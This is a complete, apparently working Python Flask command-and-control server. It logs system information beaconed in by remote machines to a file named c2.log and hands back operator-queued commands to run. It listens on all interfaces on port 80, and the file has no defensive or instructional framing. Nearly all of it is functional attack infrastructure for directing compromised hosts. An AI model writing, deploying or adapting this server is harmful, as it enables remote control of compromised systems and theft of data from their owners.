from flask import Flask, request, jsonify

import logging

app = Flask(__name__)

logging.basicConfig(filename='c2.log', level=logging.DEBUG)

latest_beacon = None
command_queue = []


@app.route('/beacon', methods=['POST'])
def beacon():
    global latest_beacon, command_queue
    data = request.get_json()
    timestamp = data.get('timestamp')
    system_info = data

    logging.info(f"Received beacon at {timestamp}: {system_info}")
    latest_beacon = system_info

    if command_queue:
        command = command_queue.pop(0)
    else:
        command = {"command": ""}

    return jsonify(command)


@app.route('/command', methods=['POST'])
def command():
    global command_queue
    data = request.get_json()
    command = data.get('command')

    if command:
        command_queue.append({"command": command})
        return jsonify({"status": "Command added"}), 200
    else:
        return jsonify({"status": "No command received"}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
